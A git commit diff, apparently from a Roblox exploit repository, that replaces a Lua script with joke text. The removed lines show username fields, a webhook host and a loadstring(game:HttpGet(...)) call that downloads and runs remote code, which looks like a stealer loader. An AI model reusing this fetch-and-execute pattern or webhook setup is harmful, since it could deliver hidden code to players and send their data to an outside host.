63cafb1adca4be3149cb323545674f1e20708aa6
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-18 17:14:14 +0200

    Overwrite Skibidi.lua

--- scripts/Skibidi.lua
+++ scripts/Skibidi.lua
@@ -1,7 +1,7 @@
+hello
 
-Username = "hi"
-Username2 = "hi"
-Webhook = "dssvx.com"
+my is
 
--- The rest of the code stays constant, and only the three fields above are updated dynamically
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Gen-v2/main/scripts/Skibidi.lua"))()
+jon cenaaa
+
+sike
